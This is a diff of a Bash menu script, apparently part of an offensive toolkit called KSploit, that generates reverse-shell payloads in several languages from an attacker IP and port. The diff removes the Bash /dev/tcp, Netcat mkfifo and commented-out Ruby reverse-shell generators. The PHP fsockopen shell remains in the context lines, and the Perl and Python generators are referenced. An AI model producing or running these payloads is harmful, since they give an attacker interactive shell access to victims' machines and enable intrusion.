@@ -154,19 +154,13 @@ echo ${YELLOW}"
    echo "	   _____________________________________________"
    echo "	  |${FGG}       KSploit Shells Menu Options:          ${NC}${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🐚${GREEN} 1 ${BLUE}Bash shell script.                  ${YELLOW}|"
+   echo "	  |    🦪${GREEN} 1 ${BLUE}PERL shell script.                  ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🦪${GREEN} 2 ${BLUE}PERL shell script.                  ${YELLOW}|"
+   echo "	  |    🐍${GREEN} 2 ${BLUE}Python shell script.                ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🐍${GREEN} 3 ${BLUE}Python shell script.                ${YELLOW}|"
+   echo "	  |    🐍${GREEN} 3 ${BLUE}Python3 shell script.               ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🐍${GREEN} 4 ${BLUE}Python3 shell script.               ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    📈${GREEN} 5 ${BLUE}PHP shell script.                   ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-#   echo "	  |    🌸${GREEN} 6 ${BLUE}Ruby shell script.                  ${YELLOW}|"
-#   echo "	  |---------------------------------------------|"
-   echo "	  |    🐱${GREEN} 6 ${BLUE}Netcat shell script.                ${YELLOW}|"
+   echo "	  |    📈${GREEN} 4 ${BLUE}PHP shell script.                   ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|"
@@ -175,30 +169,12 @@ echo ${YELLOW}"
    echo "     https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}" |fmt -w 80
    errors	
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,6,7,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
    echo
    echo
    locals
    case "$opt" in
 	1)
-	    touch $wdir/shell.sh
-            echo
-            echo "              ${FGC}   Crafting a Bash Shell script   :   ${NC}${YELLOW}"
-	    read -p '	    Set Attacker IP* ' attackerip;
-    	    read -p '	    Set Attacker Port* ' attackerport;
-   	    echo "	    🐚🐚🐚 Generating bash shell script ..."	
-	    echo -e "#!/bin/bash" > $wdir/shell.sh
-	    echo -e "bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1" >> $wdir/shell.sh
-	    echo
-	    sleep 1		    
-  	    echo -e "${FGG}${YELLOW}🐚🐚🐚   Bash Shell script saved to $wdir/shell.sh  ${NC}${YELLOW}"
-	    chmod +x $wdir/shell.sh
-	    echo
-	    echo -e "or run ${FGC}${LIGHT_CYAN} bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1 ${NC}${GREEN} on the target machine" 
-	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC} 
-            goto shelly;
-	  ;;
-	2)
 	    touch $wdir/shell.pl
             echo
             echo "              ${FGC}   Crafting a PERL Shell script   :   ${NC}${YELLOW}"
@@ -215,7 +191,7 @@ echo ${YELLOW}"
 	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto shelly;
 	  ;;
-	3)
+	2)
 	    touch $wdir/shell.py
 		echo
 		echo "              ${FGC}   Crafting a Python Shell script   :   ${NC}${YELLOW}"
@@ -232,7 +208,7 @@ echo ${YELLOW}"
 	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto shelly;
 	  ;;
-	 4)
+	 3)
 	    touch $wdir/shell3.py
 		echo
 		echo "              ${FGC}   Crafting a Python3 Shell script   :   ${NC}${YELLOW}"
@@ -249,7 +225,7 @@ echo ${YELLOW}"
 	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto shelly;
 	  ;;
-	5) 
+	4) 
 	    touch shell.php
 	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
 	    echo -e "php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > shell.php
@@ -260,72 +236,6 @@ echo ${YELLOW}"
 	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto shelly;
 	  ;; 
-	 6) 
-	    touch $wdir/netcat.sh
-            echo
-            echo "              ${FGC} Crafting a Netcat Shell script   :   ${NC}${YELLOW}"
-	    read -p '	    Set Attacker IP* ' attackerip
-    	    read -p '	    Set Attacker Port* ' attackerport
-   	    echo -e "	    🐱🐱🐱 Generating netcat shell script ..."	
-	    echo -ne '            🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-   	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    sleep .1
-	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
-	    echo -e "           ${DG} 🐱🐱🐱 Netcat Shell script saved to $wdir/netcat.sh "
-	    echo -e "            ${DG}((RUN WITH ./netcat.sh on the target))"${GREEN}
-	    echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip $attackerport >/tmp/f" > $wdir/netcat.sh
-	    echo -e "            or run: ${LIGHT_CYAN} "
-	    echo
-	    echo -e "        ${FGC}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip $attackerport >/tmp/f ${NC}${GREEN}" '\n\n' "           on the target machine"
-	    echo
-	    pause  '          '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-	    goto shelly;
-	  ;;
-#	7)
-#	    touch shell.rb
-#	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-#	    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
-#	    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
-#	    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine"
-#          goto shelly;
-#	 ;;					    
          q)
 	    clear
 	    goto $start
